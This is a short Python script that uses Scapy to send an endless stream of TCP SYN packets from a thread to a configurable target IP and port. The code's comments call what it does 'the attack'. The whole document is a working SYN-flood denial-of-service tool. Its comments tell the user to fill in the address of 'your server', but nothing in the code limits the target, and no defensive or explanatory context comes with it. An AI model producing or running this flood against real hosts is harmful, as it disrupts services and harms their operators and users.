import scapy.all as scapy
import threading
import time

target_ip = "XXX.XXX.XXX.XXX"  # Replace with the actual IP address of your server
target_port = 80  # Replace with the actual port number of your server

def send_syn_packet():
    while True:
        # Crafting a SYN packet using Scapy
        ip_packet = scapy.IP(dst=target_ip)
        tcp_packet = scapy.TCP(dport=target_port, flags="S")
        packet = ip_packet / tcp_packet

        # Sending the packet
        scapy.send(packet, verbose=False)

def main():
    # Create a thread for the SYN packet sender
    syn_thread = threading.Thread(target=send_syn_packet)

    # Start the SYN packet sender thread
    syn_thread.start()

    try:
        # Keep the attack running
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Script stopped manually.")

if __name__ == "__main__":
    main()